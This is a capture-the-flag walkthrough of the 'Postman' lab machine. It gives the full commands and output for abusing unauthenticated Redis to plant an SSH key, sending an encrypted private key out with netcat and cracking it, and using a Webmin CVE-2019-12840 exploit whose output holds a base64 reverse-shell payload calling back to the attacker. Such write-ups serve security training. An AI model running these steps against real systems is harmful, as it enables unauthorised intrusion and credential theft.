`Box: Linux`
`Level: Easy`

### Index
1.  [`Box Info`](#`Box%20Info`)
2. [`Initial Nmap`](#`Initial%20Nmap`)
3. [`Web Enumeration`](#`Web%20Enumeration`)
4. [`Redis Enumeration`](#`Redis%20Enumeration`)
	1. [`REDIS Unauthenticated Access to RCE`](#`REDIS%20Unauthenticated%20Access%20to%20RCE`)
5. [`Escalating Privileges from redis user to Matt`](#`Escalating%20Privileges%20from%20redis%20user%20to%20Matt`)
	1. [`Finding a Writable Directory`](#`Finding%20a%20Writable%20Directory`)
	2. [`John to see previously cracked password`](#`John%20to%20see%20previously%20cracked%20password`)
	3. [`SSH Login Failed`](#`SSH%20Login%20Failed`)
	4. [`When cracked pwd for private key doesn't work - try su <usernm>`](#`When%20cracked%20pwd%20for%20private%20key%20doesn't%20work%20-%20try%20su%20<usernm>`)
7. [`Privilege Escalation`](#`Privilege%20Escalation`)
	1. [`Webmin 1.910 - 'Package Updates' Remote Command Execution`](#`Webmin%201.910%20-%20'Package%20Updates'%20Remote%20Command%20Execution`)
8. [`Changing The Permission for Upload Directory & Grabbing a Web Shell`](#`Changing%20The%20Permission%20for%20Upload%20Directory%20&%20Grabbing%20a%20Web%20Shell`)

### `Box Info`
```
Postman is an easy difficulty Linux machine, which features a Redis server running without authentication. This service can be leveraged to write an SSH public key to the user&amp;#039;s folder. An encrypted SSH private key is found, which can be cracked to gain user access. The user is found to have a login for an older version of Webmin. This is exploited through command injection to gain root privileges.
```

### `Initial Nmap`
```
# nmap -p- --min-rate=1000 -sC -sV -sT -T4 -A -Pn 10.10.10.160
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```
### `Web Enumeration`
```
# gobuster dir -u http://10.10.10.160/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x zip,tar,ini,conf,jar,php,html,txt -b 404
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.160/css/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.160/fonts/]
/images               (Status: 301) [Size: 313] [--> http://10.10.10.160/images/]
/index.html           (Status: 200) [Size: 3844]
/index.html           (Status: 200) [Size: 3844]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.160/js/]
/server-status        (Status: 403) [Size: 300]
/upload               (Status: 301) [Size: 313] [--> http://10.10.10.160/upload/]
Progress: 42606 / 42615 (99.98%)
===============================================================
Finished
```

### `Redis Enumeration`
```
# nmap -p6379 --script=redis-info --min-rate=1000 -sC -sV -sT -T4 -A -Pn 10.10.10.160                                                         
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)
| redis-info: 
|   Version: 4.0.9
|   Operating System: Linux 4.15.0-58-generic x86_64
|   Architecture: 64 bits
|   Process ID: 657
|   Used CPU (sys): 6.09
|   Used CPU (user): 2.39
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 821.52K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|_    10.10.14.3
```

###### `REDIS Unauthenticated Access to RCE`
Some of the resource I followed for [REDIS Enumeration & Exploitation](https://hackviser.com/tactics/pentesting/services/redis)
```
──(root㉿kali)-[/home/ringbuffer/Downloads/Linux-Boxes/Postman.htb]
└─# echo "FLUSHALL" | redis-cli -h 10.10.10.160            
OK

┌──(root㉿kali)-[/home/ringbuffer/Downloads/Linux-Boxes/Postman.htb]
└─# (echo -e "\n\n"; cat /home/ringbuffer/.ssh/id_rsa.pub; echo -e "\n\n") > sshkey.txt

┌──(root㉿kali)-[/home/ringbuffer/Downloads/Linux-Boxes/Postman.htb]
└─# cat sshkey.txt | redis-cli -h 10.10.10.160 -x set s-key
OK

┌──(root㉿kali)-[/home/ringbuffer/Downloads/Linux-Boxes/Postman.htb]
└─# redis-cli -h 10.10.10.160
10.10.10.160:6379> GET s-key
"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgP76VkvCgv6e1aFd24DEMQQ3iwFF16GyMKF/G8pj4D9xv6go3dKVlqNjGJHtD6qCCxOMELrs3nCBJz2gCspX3cXQDxgqFNt8nQPJbv1wyIEIzdW+cJe2mR1ytkRP9GTWM6ByweKwK9wEkub3v3n+ydNS0rpdtNB5fY8WbWJsG+ZJDp5xxyS0436FrY+gJ5/7KwGqqYd1H2KqKXwy1TtfGVIVJL3vb8uSz87fIZPDwMvlhD0kZ5YgRVrsBfiw2Idn76axOc66NnrsOePJOspUHjndPSeJbrnzKMUAv31L1/6RkqDCNDn4OIFv2iOsgCgHuiUCwY0/OF8lBzP48P4hZCJfXFX9Elb8/r/IgoKNGGAp2gGdsdqTk/RzHjID7Z2X22F6afC9nnX7PKImnBHNy2JgMjS6Ifhzjb9QAD7NBbelnLCsP7eiWoMhb7hJIS+Ezziw5jn91BMxnj/waAGDwMnx3fZmKdh7gLbFKXJNKfApQSnKyP/O/t1/YV9L2LyE= ringbuffer@kali\n\n\n\n"

10.10.10.160:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"

10.10.10.160:6379> CONFIG SET dir /var/lib/redis/.ssh
OK

10.10.10.160:6379> CONFIG SET dbfilename authorized_keys
OK

10.10.10.160:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "authorized_keys"

10.10.10.160:6379> save
OK

10.10.10.160:6379> exit
```

In the above command snippet, What I did is grab the `id_rsa.pub` key for my `ringbuffer` account and put it in a the `/var/lib/redis/.ssh` directory. This was possible because the unauthenticated access to the redis was allowed. Now we can ssh with the username `redit` to the target.

```
# ssh -i /home/ringbuffer/.ssh/id_rsa redis@10.10.10.160
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```

### `Escalating Privileges from redis user to Matt`

`LinPeas Findings`
```
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                             

-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

Grabbing the above id_rsa.bak on local machine using nc. NetCat (nc) to send and receive file
```
On a receiver side
# nc -l -p 1234 > id_rsa.bak

From the Sender side
# nc -w 3 10.10.14.3 1234 < id_rsa.bak
```

Now we will need to convert this using `ssh2john` in order to crack the private key.
```
# ssh2john id_rsa.bak > id_rsa.john
```

```
# john id_rsa.john -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)     
1g 0:00:00:00 DONE (2024-10-15 01:49) 3.448g/s 851089p/s 851089c/s 851089C/s conta..comett
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

###### `Finding a Writable Directory`
```
Matt@Postman:~$ find . -writable
.
./.bashrc
./.bash_history
./.gnupg
./.gnupg/S.gpg-agent.browser
./.gnupg/S.gpg-agent
./.gnupg/pubring.kbx
./.gnupg/S.gpg-agent.extra
./.gnupg/trustdb.gpg
./.gnupg/private-keys-v1.d
./.gnupg/S.gpg-agent.ssh
./.ssh
./.ssh/id_rsa
./.ssh/id_rsa.pub
./.selected_editor
./.local
./.local/share
./.local/share/nano
./.profile
./.cache
./.cache/motd.legal-displayed
./.wget-hsts
./.bash_logout
```
###### `John to see previously cracked password`
```
# john --show id_rsa.john
id_rsa.bak:computer2008

1 password hash cracked, 0 left
```

So we have got a password `computer2008`. Let's try SSH this for the user Matt.
###### `SSH Login Failed`
Okay so we have a password for the SSH Key that we can use to login to the box. 
```
──(root㉿kali)-[/home/ringbuffer/Downloads/Linux-Boxes/Postman.htb]
└─# ssh -i id_rsa.bak matt@10.10.10.160 
Enter passphrase for key 'id_rsa.bak': 
Connection closed by 10.10.10.160 port 22
```

I tried couple of times and each time the connection was closed.
```
redis@Postman:/opt$ cat /etc/ssh/sshd_config
#deny users
DenyUsers Matt
```

That explains that the SSH is closed because the user Matt is not allowed to ssh. Hmm...Weird. I was under impression that once I cracked the Matt's key, I can SSH and get the user flag.
###### `When cracked pwd for private key doesn't work - try su <usernm>`
It turns out that the user Matt is using the same password as his password. Its just SSH was not allowed for him.

```
redis@Postman:/opt$ su Matt
Password: 
Matt@Postman:/opt$ id
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
```

Get your User Flag.

### `Privilege Escalation`

###### `Webmin 1.910 - 'Package Updates' Remote Command Execution`

However, the Metasploit module is available  for this but this one is I think one of the easiest privilege escalation. First I ran the `LinPeas` and found that I have access to a lot of files from the `/usr/share/webmin` directory. I did not have access to `/var/webmin` or `/etc/webmin` directory. I tried out that `computer2008` password on web interface and it worked. 
```
Matt@Postman:/usr/share/webmin$ cat version 
1.910
```

The WebMin version was `1.910` which is vulnerable to `CVE-2019-12840`. I found the PoC code from GitHub for [CVE-2019-12840](https://github.com/KrE80r/webmin_cve-2019-12840_poc/blob/master/CVE-2019-12840.py) Which I used to gain the root shell.

```
┌──(root㉿kali)-[/home/ringbuffer/Downloads/Linux-Boxes/Postman.htb]
└─# python2 CVE-2019-12840.py -u https://postman.htb -U "Matt" -P computer2008 -lhost 10.10.14.3 -lport 4444

[*] logging in ...

('\x1b[32m[+] got sid', '8ef5c9bc5a942ca71298e4de5302049a')

('\x1b[33m[*] sending command', u'python -c "import base64;exec(base64.b64decode(\'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjMiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p\'))"')

```

On the NetCat Listener side
```
$ sudo nc -lvnp 4444
[sudo] password for ringbuffer: 
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.160] 46422
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 

```

Grab your root flag.

### `Changing The Permission for Upload Directory & Grabbing a Web Shell`
All the following steps I did after grabbing the Root Flag. So now i have the root access of the box.
So one of the thing I was trying out which wasn't working when solving this box was to upload a web shell using the `redis`. But I did not have the writable access to the `/upload` directory. See Below

```
root@Postman:/var/www/html# ls -la
ls -la
total 56
drwxr-xr-x 7 root root  4096 Aug 26  2019 .
drwxr-xr-x 3 root root  4096 Aug 25  2019 ..
drwxr-xr-x 2 root root  4096 Aug 25  2019 css
drwxr-xr-x 2 root root  4096 Apr 23  2019 fonts
drwxr-xr-x 3 root root  4096 Apr 23  2019 images
-rw-r--r-- 1 root root  3844 Aug 25  2019 index.html
drwxr-xr-x 2 root root  4096 Apr 23  2019 js
-rw-r--r-- 1 root root 24465 Aug 25  2019 style.css
drwxr-xr-x 2 root root  4096 Aug 26  2019 upload
```

```
root@Postman:/var/www/html# chmod 777 upload    
chmod 777 upload
```

Now trying to upload a webshell using redis and grabbing a shell.

```
# redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/www/html/upload
OK
10.10.10.160:6379> config set dbfilename shell.php
OK
10.10.10.160:6379> set anything "<?php phpinfo(); ?>"
OK
10.10.10.160:6379> save
OK
```

At this point, I should expect the `phpinfo` function to execute in the browser when accessing `http://10.10.10.160/upload/shell.php` but apparently the current configuration doesn't allow the execution of the PHP functions from this place. 